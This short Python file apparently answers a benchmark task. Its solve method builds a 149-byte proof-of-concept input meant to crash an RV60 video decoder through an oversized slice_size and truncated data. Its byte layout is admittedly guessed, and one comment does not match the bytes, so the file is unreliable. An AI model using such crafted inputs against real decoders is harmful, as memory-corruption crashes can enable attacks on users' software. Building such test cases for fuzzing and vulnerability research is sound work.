class Solution:
    def solve(self, src_path: str) -> bytes:
        poc = bytearray(149)
        # Craft a minimal PoC for RV60: picture header followed by slice header with large slice_size, then minimal data
        # Assuming typical structure: start with frame header bytes, set slice_size to large value (e.g., 0xFFFF), end early
        poc[0:4] = b'\x00\x00\x01\xB6'  # Hypothetical picture start code (similar to H.263/RV style)
        poc[4:8] = b'\x00\x01\x00\x00'  # Picture header: version, type, etc.
        poc[8:12] = b'\xFF\xFF\xFF\xFF'  # Set large dimensions or params
        poc[12:16] = b'\x00\x00\x01\x00'  # Slice start code
        poc[16:20] = b'\xFF\xFF\x00\x00'  # Slice header: large slice_size (0xFFFF00 bytes, but truncated)
        # Fill rest with zeros to end input early, triggering min(remaining, header_size) < header_size
        poc[20:] = b'\x00' * 129
        return bytes(poc)